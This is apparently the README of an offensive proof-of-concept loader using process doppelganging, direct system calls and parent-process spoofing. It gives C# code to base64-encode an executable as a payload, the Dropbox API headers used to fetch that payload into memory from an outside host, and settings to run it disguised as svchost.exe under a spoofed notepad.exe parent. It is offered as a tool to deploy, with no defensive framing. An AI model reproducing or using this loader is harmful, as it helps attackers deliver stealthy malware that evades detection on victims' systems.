# ProcessDoppelganging

Process doppelganging POC using direct system calls, PPID spoofing and HTTPS sockets as an external delivery channel to download the payload directly into memory. As a POC, dropbox is used to deliver the payload but this can me easily modified.

Payload has to be a base64 encoded executable file, I use the following c# code to generate the payloads:

```C#
byte[] data = File.ReadAllBytes(@"C:\Path\to\file.exe");
string payload = Convert.ToBase64String(data);

File.WriteAllText("payload.txt", payload);
```

The following headers need to be modified at sslClient.cpp:37

```C++
LPCWSTR hHeaders = L"Authorization: Bearer <TOKEN>\r\n"
                     "Dropbox-API-Arg: {\"path\": \"/<PATH TO SHELLCODE>\"}\r\n"
                    "Content-Type: text/plain";
```

Parent process process and target application can be modifed at inject.cpp:340

```C++
    wchar_t defaultTarget[] = L"C:\\WINDOWS\\System32\\svchost.exe";
    wchar_t* targetPath = defaultTarget;

    wchar_t parentProcess_[] = L"notepad.exe";
    wchar_t* parentProcess = parentProcess_;
```